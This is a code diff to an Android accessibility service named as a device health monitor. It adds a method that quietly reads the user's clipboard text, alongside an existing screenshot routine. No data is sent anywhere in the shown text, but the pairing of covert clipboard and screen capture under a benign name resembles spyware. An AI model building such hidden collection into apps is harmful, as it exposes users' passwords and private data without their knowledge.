@@ -1,6 +1,9 @@
 package com.device.health.monitor;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.graphics.Bitmap;
 import android.os.Build;
 import android.view.accessibility.AccessibilityEvent;
@@ -18,6 +21,18 @@ public class MonitorService extends AccessibilityService {
     @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
     @Override public void onInterrupt() {}
     @Override public void onDestroy() { instance = null; super.onDestroy(); }
+
+    String getClipboard() {
+        try {
+            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            ClipData cd = cm != null ? cm.getPrimaryClip() : null;
+            if (cd != null && cd.getItemCount() > 0) {
+                CharSequence t = cd.getItemAt(0).coerceToText(this);
+                return t != null ? t.toString() : null;
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
 
     void snap() {
         if (Build.VERSION.SDK_INT < 30) return;
